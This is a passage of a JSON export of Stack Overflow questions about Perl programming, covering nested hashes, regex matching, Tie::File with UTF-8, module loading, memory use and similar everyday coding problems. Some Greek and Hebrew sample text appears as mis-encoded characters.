$value;\n\nforeach my $line (@exonslength) {\n\n    @split_exons = split \"\\t\", $line;\n\n    @hash_doc2 {$split_exons[0]} = ($split_exons[1]);\n\n if (exists $hash_doc2{$split_exons[0]}) {\n\n    if ( $hash_doc2{$split_exons[0]} &gt; values %hash_doc2) {\n\n     $hash_doc2{$split_exons[0]} = ($split_exons[1]);\n\n    } else {next;}\n       }\n   }\n\n#3) grep the non redundant list of gene from the hash with the corresponding value\n\nmy @a =  grep (@not_red,%hash_doc2);\nprint \"@a\\n\";\n</code></pre>\n"},{"tags":["html","perl","parsing"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":26,"score":2,"question_id":13234838,"title":"Perl -> HTML multiple choice parser","body":"<p>Ok, so I'm trying to make my own markup language [for a class, I know it's dumb] and I'm having a lot of trouble getting it run.  <strong>It seems to get stuck (just pauses and I assume is caught in a loop.) as soon as I add the text that causes the arraySplitter function to be called.</strong>  I can provide information and output if you'd like.  This seems like a simple error, as I am rather new to perl.</p>\n\n<pre><code>#JokeCode -&gt; HTML\n\nuse strict;\nuse warnings;\nuse Getopt::Std;\nmy %opts=();\n\ntheFunctionThatActuallyParsesTheNonsense($opts{i});\nmy $questionCounter;\nmy $tempVar;\nmy @arrayForSplit;\nmy @goodArray;\nmy $curLine;\nsub theFunctionThatActuallyParsesTheNonsense\n{\nmy $outputF = $_[0];\n$questionCounter= 0;\n\nwhile (&lt;LINES&gt;)\n{\n      $curLine= $_;\n        if($curLine =~ m/&amp;&amp;url/)\n    {\n\n        @arrayForSplit = split(/ /,$_);\n        $curLine =~ s/$arrayForSplit[1]//;\n        $curLine =~ s/$arrayForSplit[2]//;\n        $curLine =~ s/&amp;&amp;url/&lt;a href=\"$arrayForSplit[1]\"&gt;$arrayForSplit[2]/;\n        $curLine =~ s/url&amp;&amp;/&lt;\\/a&gt;/;\n        print @arrayForSplit;\n\n    }\n\n\n    $curLine =~ s/\\&amp;\\&amp;b /&lt;b&gt;/;\n    $curLine =~ s/ b\\&amp;\\&amp;/&lt;\\/b&gt;/;\n\n    $curLine =~ s/&amp;&amp;i /&lt;i&gt;/;\n    $curLine =~ s/ i&amp;&amp;/&lt;\\/i&gt;/;\n\n    $curLine =~ s/&amp;&amp;u /&lt;u&gt;/;\n    $curLine =~ s/ u&amp;&amp;/&lt;\\/u&gt;/;\n\n    $curLine =~ s/&amp;&amp;tt/&lt;tt&gt;/;\n    $curLine =~ s/tt&amp;&amp;/&lt;\\/tt&gt;/;\n\n    $curLine =~ s/&amp;&amp;grn/&lt;span style=\"color:#00ff00\"&gt;/;\n    $curLine =~ s/grn&amp;&amp;/&lt;\\/span&gt;/;\n\n    $curLine =~ s/&amp;&amp;red/&lt;span style=\"color:#ff0000\"&gt;/;\n    $curLine =~ s/red&amp;&amp;/&lt;\\/span&gt;/;\n\n    $curLine =~ s/&amp;&amp;blu/&lt;span style=\"color:#0000ff\"&gt;/;\n    $curLine =~ s/blu&amp;&amp;/&lt;\\/span&gt;/;\n\n    $curLine =~ s/&amp;&amp;ex/&lt;pre class=\"code\"&gt;/;\n    $curLine =~ s/ex&amp;&amp;/&lt;\\/pre&gt;/;\n\n    if($curLine =~  m/&amp;&amp;tf/)\n    {\n        $curLine =~ s/&amp;&amp;tf/&lt;form&gt;&lt;br&gt;&lt;input type=\"text\" name=\"$questionCounter\"&gt;&lt;\\/form&gt;/;\n        $curLine =~ s/tf&amp;&amp;//;\n        $questionCounter++;\n    }\n    print \"even here?\";\n    if($curLine =~ m/&amp;&amp;mc/)\n    {\n        print \"How bout now?\";\n        @goodArray = arraySplitter($curLine);\n\n        foreach (@goodArray)\n        {\n\n            $curLine =~ s/&amp;&amp;mc/&lt;input type=\"radio\" name=\"$questionCounter\" value=\"$_\"&gt; $_ &lt;br&gt;/;\n        }\n        $curLine =~ s/&amp;&amp;mc/&lt;br&gt;/;\n        $curLine =~ s/mc&amp;&amp;/&lt;input type=\"radio\" name=\"questionCounter\" style=\"display: none;\"\\/&gt;/;\n        $questionCounter++;\n    }   \n    print OUT $curLine;\n    print OUT \"\\n\";\n\n}\n\n\nsub arraySplitter\n{\nprint \"Are you still there?\";\nmy @retArray;\nmy $arrayPlace = 0;\nmy @mcArray = split(/ /,$_[0]);\nprint @mcArray;\n    if(scalar(@mcArray)-1 &lt; 1)\n    {\n    print \"The size of the array is 0\";\n    exit 1;\n    }\nwhile ($arrayPlace &lt; scalar(@mcArray)-1)\n{\n    $retArray[$arrayPlace] = $mcArray[$arrayPlace];\n}\nprint @retArray;\nreturn @retArray;\n}\n}\n</code></pre>\n"},{"tags":["perl","runtime","packages","require"],"answer_count":6,"favorite_count":3,"up_vote_count":10,"down_vote_count":0,"view_count":1530,"score":10,"question_id":442710,"title":"How do I use a Perl package known only in runtime?","body":"<p>I have a Perl program, that needs to use packages (that I also write). Some of those packages are only chosen in Runtime (based on some environment variable). I don't want to put in my code a \"use\" line for all of those packages, of course, but only one \"use\" line, based on this variable, something like:</p>\n\n<pre><code>use $ENV{a};\n</code></pre>\n\n<p>Unfortunately, this doesn't work, of course. Any ideas on how to do this?</p>\n\n<p>Thanks in advance,\nOren</p>\n"},{"tags":["perl","module"],"answer_count":2,"favorite_count":2,"up_vote_count":4,"down_vote_count":0,"view_count":87,"score":4,"question_id":13219442,"title":"Find unused \"use'd\" Perl modules","body":"<p>I am working on a very large, very old \"historically grown\" codebase. In the past, there were often people thinking \"Oh, I may need this and that module, so I just include it...\", and later, people often \"cached\" Data inside of modules (\"use ThisAndThat\" needing a few seconds to load some hundred MB from DB to RAM, yeah, its really a stupid Idea, we are working on that too) and so, often, we have a small module use'ing like 20 or 30 modules, from who 90% are totally unused in the source itself, and, because of \"caching\" in several use'd submodules, modules tend to take up one minute to load or even more, which is, of course, not acceptable. </p>\n\n<p>So, Im trying to get that done better. Right now, my way is looking through all the modules, understanding them as much as possible and I look at all the modules including them and see whether they are needed or not.</p>\n\n<p>Is there any easier way? I mean: There are functions returning all subs a module has like</p>\n\n<pre><code>...\nreturn grep { defined &amp;{\"$module\\::$_\"} } keys %{\"$module\\::\"}\n</code></pre>\n\n<p>, so, aint there any simple way to see which ones are exported by default and which ones come from where and are used in the other modules?</p>\n\n<p>A simple example is Data::Dumper, which is included in nearly every file, even, when all debug-warns and prints and so on arent in the script anymore. But still the module has to load Data::Dumper.</p>\n\n<p>Is there any simple way to check that? </p>\n\n<p>Thanks!</p>\n"},{"tags":["perl","installation","module"],"answer_count":5,"favorite_count":0,"up_vote_count":3,"down_vote_count":1,"view_count":5257,"score":2,"question_id":2279414,"title":"Why does my Perl program complain \"Can't locate URI.pm in @INC\"?","body":"<p>I'm new to Perl. I get the following error when I run a script:</p>\n\n<pre>Can't locate URI.pm in @INC (@INC contains: /usr/local/packages/perl_remote/5.6.1/lib/5.6.1/i86pc-solaris /usr/local/packages/perl_remote/5.6.1/lib/5.6.1 /usr/local/packages/perl_remote/5.6.1/lib/site_perl/5.6.1/i86pc-solaris /usr/local/packages/perl_remote/5.6.1/lib/site_perl/5.6.1 /usr/local/packages/perl_remote/5.6.1/lib/site_perl .) at (eval 2) line 3.\nCompilation failed in require at /usr/local/packages/perl_remote/5.6.1/lib/site_perl/5.6.1/HTTP/Request.pm line 3.\nCompilation failed in require at /usr/local/packages/perl_remote/5.6.1/lib/site_perl/5.6.1/LWP/UserAgent.pm line 10.\nBEGIN failed--compilation aborted at /usr/local/packages/perl_remote/5.6.1/lib/site_perl/5.6.1/LWP/UserAgent.pm line 10.\nCompilation failed in require at /usr/local/packages/perl_remote/5.6.1/lib/site_perl/5.6.1/LWP/Simple.pm line 26.\nBEGIN failed--compilation aborted at /usr/local/packages/perl_remote/5.6.1/lib/site_perl/5.6.1/LWP/Simple.pm line 26.\nCompilation failed in require at txotf_0_install.pl line 35.\nBEGIN failed--compilation aborted at txotf_0_install.pl line 35.</pre>\n\n<p>What could be the possible reasons of this and how do I get the script to work. Any help will be appreciated.</p>\n"},{"tags":["perl","environment-variables"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":37,"score":0,"question_id":13232183,"title":"Importing environment variables set by batch file in parent perl script","body":"<p>I am writing a cross-platform build script in perl for code compilation.</p>\n\n<p>In windows i need to execute vsvars32.bat to set the environment variables.</p>\n\n<pre><code>sub set_win_env {\n      #MSVC version 9.0 is installed\n      $VS90COMNTOOLS = $ENV{'VS90COMNTOOLS'};\n      $VS90COMNTOOLS .= \"vsvars32.bat\"\n      if($VS90COMNTOOLS ne \"\") {\n          system(\"$VS90COMNTOOLS\");\n      }\n }\n</code></pre>\n\n<p>The environment variables set by executing the batch files gets lost as interpreter spawns another shell to execute the batch file.</p>\n\n<p>How can i import those variables in the parent perl script.</p>\n"},{"tags":["perl","growl","growl-for-windows"],"answer_count":0,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":33,"score":2,"question_id":13225386,"title":"How can I include a hyperlink in a Growl notification?","body":"<p>I couldn't find any code to do so on Growl's documentation (which IMO is pretty terrible), nor in the Perl libraries on CPAN. The most recently updated Perl module, <a href=\"http://search.cpan.org/perldoc?Growl%3A%3AGNTP\" rel=\"nofollow\">Growl::GNTP</a> doesn't show any code snippet that would enable <a href=\"http://growl.info/documentation/webkit.php\" rel=\"nofollow\">custom displays</a>, which is apparently how formatting links should be done.</p>\n\n<p>I know though that it's <a href=\"http://stackapps.com/questions/820/soapi-notify-stay-ahead-of-the-pack-with-new-question-notification-v1-release\">possible</a> to include hyperlinks in Growl notifications, despite what <a href=\"http://stackoverflow.com/questions/5050676/inline-styling-of-growl-notifications\">some say</a>.</p>\n\n<p>Perl or PHP code preferred.</p>\n"},{"tags":["perl","lookup","symbol","lcov"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":50,"score":0,"question_id":13226772,"title":"/usr/bin/perl : Symbol look-up error; undefined symbol: Perl_Istack_sp_ptr","body":"<p>Whenever I am using <code>lcov</code> command (lcov-1.9) for <code>gcc 3.4</code> compiled objects and the corresponding <code>.gcda</code> files, I get an error.</p>\n\n<p>Command I execute: </p>\n\n<pre><code>lcov -c -d . --gcov-tool /usr/bin/gcov34  -o datafile\n</code></pre>\n\n<p>Error:</p>\n\n<pre><code>/usr/bin/perl: symbol lookup error: /u01/R122_EBS/fs1/FMW_Home/webtier/perl/lib/5.10.0/x86_64-linux-thread-multi/auto/Cwd/Cwd.so: undefined symbol: Perl_Istack_sp_ptr\n</code></pre>\n\n<p>Is it because something is wrong with Perl? (But, Perl on our development server should be probably be alright.) Or because of some version mismatches between lcov and GCC or something else?</p>\n\n<p>Any clues?</p>\n"},{"tags":["perl","split"],"answer_count":5,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":66,"score":2,"question_id":13224684,"title":"Splitting a string which contains numerical digits in Perl","body":"<p>I want to split a string(which has numerical digits). In the below example, I want to split the string at k and k1.</p>\n\n<pre><code>my @array1=(\"0\",\"23\",\"1\",\"4\",\"65\",\"7\");\n$k=1;$k1=0;\nmy $j=join(\"\",@array1);\nmy @ar=split(/($k|$k1)/,$j);\nprint join(\";\",@ar),\"\\n\\n\";\n</code></pre>\n\n<p>The output is <code>;0;23;1;4657</code></p>\n\n<p>In the above output, extra semicolon \";\" is printing</p>\n\n<p>The expected output is <code>0;23;1;4657</code></p>\n\n<p>When I try the above code for the below example, the output is correct: <code>(0;5;123;4;6)</code>; the extra semicolon is not printing here.</p>\n\n<pre><code>my @array1=(\"0\",\"5\",\"1234\",\"6\");\n$k=5;$k1=4;\n</code></pre>\n\n<p>I am not sure, for what reason the first example is printing extra semicolon \";\"</p>\n\n<p>Can some one help me in this? </p>\n"},{"tags":["perl"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":2,"view_count":53,"score":-1,"question_id":13228048,"title":"Reverse the order of first 3 words of input line using Pattern matching","body":"<p>I have a question in Perl:\nReverse the order of the first three words of each input line using the substitution operator. Leave the spacing unchanged, and print each resulting line.</p>\n\n<p>How can I solve this?Any idea?Thanks in advance.</p>\n"},{"tags":["perl","gd-graph"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":30,"score":0,"question_id":13193057,"title":"png method error while using GD::Graph in Perl","body":"<p>While compiling a perl script for making a graph and saving it into png file, I get the following error - \nCan't locate object method \"png\" via package \"GD::Graph::bars\" (perhaps you forgot to load \"GD::Graph::bars\"?)</p>\n\n<p>Any idea how to solve it ?</p>\n\n<p>The following is my code - </p>\n\n<pre><code>use CGI ':standard';\nuse GD::Graph::bars;\nunlink(\"abc.png\");\nopen (PIC, \"&gt;abc.png\") or die \"an error occured: $!\";\nbinmode PIC;\n\nmy @data = ([\"Jan\", \"Feb\"],[23, 5]);\n\nmy $mygraph = GD::Graph::bars-&gt;new(500, 500);\n\n$mygraph-&gt;set(\nx_label     =&gt; 'Month',\ny_label     =&gt; 'Number of Hits',\ntitle       =&gt; 'Number of Hits in Each Month in 2002',) or warn $mygraph-&gt;error;\n\nmy $myimage = $mygraph-&gt;plot(\\@data) or die $mygraph-&gt;error;\n\nprint PIC $mygraph-&gt;png;\nclose(PIC);\n</code></pre>\n\n<p>Thanks</p>\n"},{"tags":["perl","hyperlink","extract","crawler"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":787,"score":0,"question_id":1799803,"title":"How do I extract links in JavaScript that point to HTML pages in Perl?","body":"<p>I want to extract all the links from a page. I am using <a href=\"http://search.cpan.org/perldoc?HTML%3A%3ALinkExtor\" rel=\"nofollow\"><code>HTML:LinkExtor</code></a>. How do I extract all the links that point to HTML content pages only?</p>\n\n<p>I also cannot extract these kinds of links:</p>\n\n<pre><code>javascript:openpopup('http://www.admissions.college.harvard.edu/financial_aid/index.html'),\n</code></pre>\n\n<p>EDIT: HTML Pages - text/html. I am not indexing pictures etc.</p>\n"},{"tags":["perl"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":44,"score":0,"question_id":13226744,"title":"How to parse string in perl having timezone of format GMT[+/-]hh:mm?","body":"<p>I have a string of date and time of format: \nDay, Month DAY_OF_MONTH, Year HH:MM:SS AM/PM GMT[+/-]hh:mm .</p>\n\n<p>But I am unable to parse it. I have used this:</p>\n\n<pre><code>Time::Piece-&gt;strftime($string, \"%A, %B %d, %Y %I:%M:%S %p %Z%z\");\n</code></pre>\n\n<p>I have converted the string into the format : Day, Month DAY_OF_MONTH, Year HH:MM:SS AM/PM [+/-]hhmm . But still its not working for me with</p>\n\n<pre><code>Time::Piece-&gt;strftime($string, \"%A, %B %d, %Y %I:%M:%S %p %z\");\n</code></pre>\n\n<p>The string is getting parsed but the time zone is not considered in the Time::Piece object as tzoffset is 0000 and the HH of the date has the same value as that in the string. Please anyone help.</p>\n\n<p>Eg: String to be parsed: Friday, July 25, 2008 12:15:57 PM GMT-0700</p>\n"},{"tags":["perl","apache","mod-perl2"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":21,"score":1,"question_id":13218737,"title":"mod_perl and multiple virtual hosts","body":"<p>We have this situation:\n- Apache running mod_perl\n- Multiple virtual hosts with own directories\n- Each virtual module has the same name for perl modules (development hosts, module differ a little bit, but have the same names)\n- Apache2::Reload for each virtual host to reload module on change</p>\n\n<p>But apache throws 500 error on every 1/3 requests for the page reload and without specific error in the log, only warnings about \"redefined functions\".</p>\n\n<p>Maybe there are some requirements to run the same module names but different paths and distinct them?</p>\n"},{"tags":["mysql","sql","perl","query","dbi"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":67,"score":0,"question_id":13172755,"title":"Replace quotation marks in sql query in perl script","body":"<p>I have a text file of data that I am importing into a MySQL database. Some of the lines unfortunatley contain quotation marks, which causes my SQL queries to go haywire. I would like to get rid of any field that has quotation marks, or at very least ignore them in my query.</p>\n\n<p>I found something that might work, but being as this is run through a Perl script I am having issues \"escaping\" the quotation marks. I really don't know how and can't figure it out. I would like to just search through my table and delete any quotation marks (\") that it may find or replace it with a single quotation mark or space or anything really.</p>\n\n<pre><code>my $myreplacequery = \"REPLACE(s.Title, '\"','')\";\n$sth = $dbh-&gt;prepare($myreplacequery);\n$sth-&gt;execute;\n</code></pre>\n\n<p>Anyone have any ideas?</p>\n\n<p>Thanks!</p>\n"},{"tags":["regex","perl"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":55,"score":1,"question_id":13225860,"title":"How to match word surronded by spaces OR at the end / beginning of the string using Perl regexp?","body":"<p>I want to find sequences matching my regexp should they be in the middle of the string surrounded by spaces, in the end or beginning or be the only thing in a string.</p>\n\n<p><strong>Example:</strong>\nLet's assume the sequence <code>'qwe45rty'</code> is what we are looking for. I want to be able to get positive on all of these strings:</p>\n\n<p><code>'qwe45rty'</code> <code>'qwe45rtyÂ blabla'</code> <code>'smthÂ qwe45rtyÂ blabla'</code> <code>'smthÂ qwe45rty'</code> <code>'Â qwe45rtyÂ '</code></p>\n\n<p>But none of these:</p>\n\n<p><code>'aaqwe45rty'</code> <code>'qwe45rtybb'</code> <code>'aaqwe45rtybb'</code></p>\n\n<p>Best what I came up with is smth like this:</p>\n\n<pre class=\"lang-perl prettyprint-override\"><code>if ( ($a =~ /\\s+$re\\s+/) or\n     ($a =~ /^$re\\s+/)   or\n     ($a =~ /\\s+$re$/)   or\n     ($a =~ /^$re$/)        )\n{\n    # do stuff\n}\n</code></pre>\n\n<p>which can't be the best way to do that :)</p>\n\n<p>Any suggestions?</p>\n"},{"tags":["perl"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":56,"score":1,"question_id":13225270,"title":"Perl - reading in multi-line records from config file","body":"<p>I'm trying to read in a multi-line config file with records into a perl hash array</p>\n\n<p>Example Config File:</p>\n\n<pre><code>    record_1\n      phone=5551212\n      data=1234234\n    end_record_1\n\n    record_2\n      people_1=bob\n      people_2=jim\n      data=1234\n    end_record_2\n\n    record_3\n     people_1=sue\n    end_record_3\n</code></pre>\n\n<p>here's what I'm looking for:</p>\n\n<pre><code>$myData{1}{\"phone\"}  &lt;--- 5551212\n$myData{1}{\"data\"}   &lt;--- 1234234\n\n$myData{2}{\"people_1\"} &lt;--- bob\n... etc\n</code></pre>\n\n<p>What's the best way to read this in?  Module?  Regex with multi-line match?  Brute force?  I'm up in the air on where to head next.</p>\n"},{"tags":["perl","file"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":41,"score":0,"question_id":13207468,"title":"Assign completely missing tags(all 'o') with previously assigned tags in a file using perl file operations?","body":"<pre class=\"lang-none prettyprint-override\"><code>Indira          NNP     B-NP    1       1       B-LOCATION      B-LOCATION\nGandhi          NNP     I-NP    1       1       I-LOCATION      I-LOCATION\nNational        NN      I-NP    1       1       I-LOCATION      I-LOCATION\nSanctuaries     NNS     I-NP    1       1       I-LOCATION      I-LOCATION\n\nIndira          NNP     B-NP    1       1       B-LOCATION      o\nGandhi          NNP     I-NP    1       1       I-LOCATION      o\nNational        NN      I-NP    1       1       I-LOCATION      o\nSanctuaries     NNS     I-NP    1       1       I-LOCATION      o\n\nIndira          NNP     B-NP    1       1       B-LOCATION      B-PERSON\nGandhi          NNP     I-NP    1       1       I-LOCATION      I-PERSON\nNational        NN      I-NP    1       1       I-LOCATION      o\nSanctuaries     NNS     I-NP    1       1       I-LOCATION      o\n</code></pre>\n\n<p>In such a file, I would like to replace 7th column which has 'o' with the 7th column entities which match perfectly. i.e. 2nd four lines should be tagged while the next four lines should not as all the entities in 7th column are not 'o' and likewise. Also, If there   are 4 occurrences of any given entity, and in 2 places its 7th column is B-PERSON followed by I-PERSON or B-ORG followed by I-ORG and at one place it has B-LOC followed by I-LOC, I would like to replace the 4th occurrence's 7th column with B-PERSON followed by I-PERSON or B-ORG followed by I-ORG (max occurrences).</p>\n"},{"tags":["perl","hash","foreach"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":55,"score":1,"question_id":13226232,"title":"Attempting to Iterate over hash of hash in perl. What's wrong with this approach?","body":"<p>I am trying to iterate over items in the data structure that uses nested hash.\nTo do so, I wanted to see what keys are in there.</p>\n\n<p>The following is what I have tried. But I am getting an error</p>\n\n<pre><code>    my %tgs = (\n        'articles' =&gt;  {\n                           'vim' =&gt; 'about vim',\n                           'awk' =&gt; 'about awk',\n                           'sed' =&gt; 'about sed'\n                       },\n        'ebooks'   =&gt;  {\n                           'linux 101'    =&gt; 'about linux',\n                       }\n    );\n\n    foreach my $k (keys %tgs){\n        print $k;\n        print \"\\n\";\n        foreach my $k2 (keys %$tgs{$k}){ #&lt;-----this is where perl is having a problem\n            print $k2;\n            print \"\\n\";\n        }\n    }\n\nsyntax error at PATH line #, near \"$tgs{\"\nsyntax error at PATH line #, near \"}\"\nExecution of PATH aborted due to compilation errors.\n</code></pre>\n\n<p>What's is wrong with my approach? My reasoning was since $tgs{$k} returns the reference of hash, I could dereference it in for each loop, but I guess not?</p>\n"},{"tags":["xml","perl","xml-parsing"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":61,"score":0,"question_id":13216703,"title":"To replace text between tags that span multiple lines by another text in perl","body":"<p>I need to replace a multiline text between the tags(<code>&lt;stats&gt;...&lt;/stats&gt;</code>) in a file with another multiline text from other file in Perl. I'm using search and replace functions but not working currently. If both the start tag and end tag are in the same line then I am able to replace them else its not replacing. For Ex,in destination file:</p>\n\n<pre><code>    .\n    .\n    .\n\n    &lt;stats&gt;\n    &lt;stat type=\"string\" value=\"a\" /&gt;\n    &lt;stat type=\"string\" value=\"b\" /&gt;\n    &lt;stat type=\"string\" value=\"c\" /&gt;\n    &lt;stat type=\"string\" value=\"d\" /&gt;\n    &lt;/stats&gt;\n\n    .\n    .\n    .\n    .\n</code></pre>\n\n<p>A part of my code snippet is as follows:</p>\n\n<pre><code>my $replacetext=\"&lt;stats&gt;\".\"@lines\".\"&lt;/stats&gt;\";\nmy $searchtext=\"&lt;stats&gt;.*&lt;/stats&gt;\";\n\n# Here @file_lines is the array containing destination file and  @lines is the array containing source file.\n\nforeach (@file_lines) \n{\n      $_=~ s/$searchtext/$replacetext/g;\n}\n</code></pre>\n\n<p><code>'.*'</code> work only if start tag and end tag are in same line. </p>\n"},{"tags":["perl","file","line"],"answer_count":3,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":398,"score":1,"question_id":8551262,"title":"Reading a specific line from large file in Perl","body":"<p>Is there any fast and memory efficient way to read specific lines of large file, without loading it to memory?</p>\n\n<p>I wrote a perl script, that runs many forks and I would like them to read specific lines from a file.</p>\n\n<p>At the moment Im using an external command:</p>\n\n<pre><code>sub getFileLine {\n    my ( $filePath, $lineWanted ) = @_;\n    $SIG{PIPE} = '_IGNORE_';\n    open( my $fh, '-|:utf8', \"tail -q -n +$lineWanted \\\"$filePath\\\" | head -n 1\" );\n    my $line = &lt;$fh&gt;;\n    close $fh;\n    chomp( $line );\n    return $line;\n}\n</code></pre>\n\n<p>Its fast and it works - but maybe there's a more \"Perl-ish\" way, as fast and as memory efficient as this one?</p>\n\n<p>As you know, creating a fork process in Perl duplicates the main process memory - so if the main process is using 10MB, the fork will use at least that much.</p>\n\n<p>My goal is to keep fork process (so main process until running forks also) memory use as low as possible. Thats why I dont want to load the whole file into memory.</p>\n"},{"tags":["perl","memory","windows-7","virtual-memory","strawberry-perl"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":65,"score":0,"question_id":13212374,"title":"Computing system memory in use in Perl","body":"<p>I followed the top answer <a href=\"http://stackoverflow.com/questions/1115743/how-can-i-programmatically-determine-my-perl-programs-memory-usage-under-window\">here, see below for code</a> to get system memory being used at a given line in my perl code. I'm running Windows 7 Home Basic, 64 bit, 4 GB ram, 4.06 GB Virtual memory (As specified under <strong>advanced system settings</strong> under My computer). I got following message from perl at a line, before perl goes <strong>Out of Memory</strong>.</p>\n\n<blockquote>\n  <p>Memory usage: 1916346368</p>\n</blockquote>\n\n<p>Assuming that this number is in bytes (= 1.78 GB), why did perl go Out of Memory? How can I get system total memory usage by all the processes?</p>\n\n<p>Code block to compute memory is as below. I'm using Strawberry Perl 5.12.3.0</p>\n\n<pre><code>use Win32::OLE qw/in/;\n\nsub memory_usage() {\n    my $objWMI = Win32::OLE-&gt;GetObject('winmgmts:\\\\\\\\.\\\\root\\\\cimv2');\n    my $processes = $objWMI-&gt;ExecQuery(\"select * from Win32_Process where ProcessId=$$\");\n\n    foreach my $proc (in($processes)) {\n        return $proc-&gt;{WorkingSetSize};\n    }\n}\n\nprint 'Memory usage: ', memory_usage(), \"\\n\";\n</code></pre>\n\n<p>Perl -V gives following info\n<a href=\"http://pastebin.com/mvF7YgKH\" rel=\"nofollow\">http://pastebin.com/mvF7YgKH</a></p>\n\n<p><strong>Update:</strong> The problem got solved with 64 bit perl. But I also noticed that the program ran w/o hitch on 32 bit perl on Ubuntu. So, may be Strawberry perl on Windows takes more memory than perl on Ubuntu.</p>\n"},{"tags":["arrays","perl","for-loop","last"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":50,"score":0,"question_id":13215182,"title":"Lotto Code: statisfy the three types of inputs","body":"<p>Here is the code. It's a lotto game. The user enters 6 numbers, it stores it in an array. Then it's supposed to output the winning number. I want the program to out put \"You win 1! YOu win 2!\" when the input numbers are: 1 1 1 2 2 2</p>\n\n<p>Here is part of the coed </p>\n\n<pre><code> my %counts = ();\n\nfor (@array) {$counts{$_}++;}\n\nfor my $key (keys %counts) {\n\n  if ($counts{$key} &gt;= 3) \n    {$amount = \"\\$$key\";}\n}\n    if ($amount) \n        {print \"You win $amount!\\n\";}\n    else\n        {print \"Sorry, better luck next time!\";}\n</code></pre>\n\n<p>Thanks, hope this is clear</p>\n"},{"tags":["perl","unicode","utf-8","tie"],"answer_count":1,"favorite_count":0,"up_vote_count":5,"down_vote_count":0,"view_count":142,"score":5,"question_id":13209474,"title":"Why is my Perl program failing with Tie::File and Unicode/UTF-8 encoding?","body":"<p>I am working on a project which deals with data in foreign languages. My Perl scripts were running fine. </p>\n\n<p>I then wanted to use Tie::File, since this is a neat concept (and saves time and coding). </p>\n\n<p>It seems that Tie:File is failing under Unicode/UTF-8 (unless I am missing something).</p>\n\n<p>Here is a program which depicts the problem: (The data is a mix of English, Greek and Hebrew):</p>\n\n<pre><code>use strict;\n use warnings;\n use 5.014; \n use Win32::Console;\n use autodie; \n use warnings qw&lt; FATAL utf8 &gt;;\n use Carp;\n use Carp::Always;\n use utf8;\n use feature        qw&lt; unicode_strings&gt;;\n use charnames      qw&lt; :full&gt;;\nuse Tie::File;\n\nmy ($i);\nmy ( $FileName);\nmy (@Tied);\nbinmode STDOUT, ':unix:utf8';\nbinmode STDERR, ':unix:utf8';\nbinmode $DB::OUT, ':unix:utf8' if $DB::OUT; # for the debugger\nWin32::Console::OutputCP(65001);         # Set the console code page to UTF8\n\n$FileName = 'E:\\\\My Documents\\\\Technical\\\\Perl\\\\Eclipse workspace\\\\Work\\\\'.\n        'Tie File test res.txt';\ntie @Tied, 'Tie::File', $FileName, recsep =&gt; \"\\x0D\\x0A\", discipline =&gt; ':encoding(utf8)'\n            or confess 'tie @Tied failed';\n$i =0;\nwhile (&lt;DATA&gt;) {\n    chomp;\n    $Tied[$i] = $_;\n    ++$i;\n} # end while (&lt;DATA&gt;) \n$i =0;\nforeach (@Tied) {\n    say \"$i $Tied[$i]\";\n    ++$i;\n} # end foreach (@Tied)\nuntie $FileName;\n__DATA__\nÏÎ¹ ÎºÎ¬Î½ÎµÏÎµ;\nÏÎ¬ÏÏÎµ ÏÎ¿ Î® Î±ÏÎ®ÏÏÎµ ÏÎ¿\n×©××× ×××¨××\nabc ×× ×××× efg\n××ª× ×××× This is it\n××¢××©×× ××¢××©×× \nÎ£Î®Î¼ÎµÏÎ± ÎµÎ¯Î½Î±Î¹ Î¤ÏÎ¯ÏÎ·\nÎÎ­Î»Ï Î½Î± ÏÎ¬Ï\nÏÎ¹ ÎºÎ¬Î½ÎµÏÎµ;\n×©××¨× ××¡' 5\n</code></pre>\n\n<p>This produces a huge cascade of warnings: here is some:</p>\n\n<pre><code>utf8 \"\\xCE\" does not map to Unicode at F:/Win7programs/Dwimperl/perl/lib/Tie/File.pm line 917\n        Tie::File::_read_record('Tie::File=HASH(0x24cb72c)') called at F:/Win7programs/Dwimper\nl/perl/lib/Tie/File.pm line 175\n        Tie::File::_fetch('Tie::File=HASH(0x24cb72c)', 0) called at F:/Win7programs/Dwimperl/p\nerl/lib/Tie/File.pm line 210\n        Tie::File::STORE('Tie::File=HASH(0x24cb72c)', 0, 'ÏÎ¹ ÎºÎ¬Î½ÎµÏÎµ;') called at tie file test\n.pl line 31\nutf8 \"\\xCF\" does not map to Unicode at F:/Win7programs/Dwimperl/perl/lib/Tie/File.pm line 917\n        Tie::File::_read_record('Tie::File=HASH(0x24cb72c)') called at F:/Win7programs/Dwimper\nl/perl/lib/Tie/File.pm line 175\n        Tie::File::_fetch('Tie::File=HASH(0x24cb72c)', 0) called at F:/Win7programs/Dwimperl/p\nerl/lib/Tie/File.pm line 210\n        Tie::File::STORE('Tie::File=HASH(0x24cb72c)', 0, 'ÏÎ¹ ÎºÎ¬Î½ÎµÏÎµ;') called at tie file test\n.pl line 31\nutf8 \"\\xD7\" does not map to Unicode at F:/Win7programs/Dwimperl/perl/lib/Tie/File.pm line 917\n        Tie::File::_read_record('Tie::File=HASH(0x24cb72c)') called at F:/Win7programs/Dwimper\nl/perl/lib/Tie/File.pm line 175\n        Tie::File::_fetch('Tie::File=HASH(0x24cb72c)', 0) 